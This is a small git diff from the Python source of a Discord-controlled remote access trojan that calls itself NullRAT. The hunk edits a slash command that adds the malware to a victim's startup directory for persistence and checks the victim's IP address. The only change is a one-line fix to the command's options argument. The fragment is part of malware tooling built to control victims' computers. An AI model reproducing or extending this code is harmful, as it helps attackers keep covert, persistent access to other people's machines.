@@ -15,7 +15,7 @@ class Startup(commands.Cog):
         
     @commands.slash_command(
         description="Add NullRAT to startup directory",
-        options=[self.bot.victim],
+        options=[bot.victim],
     )
     async def startup(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
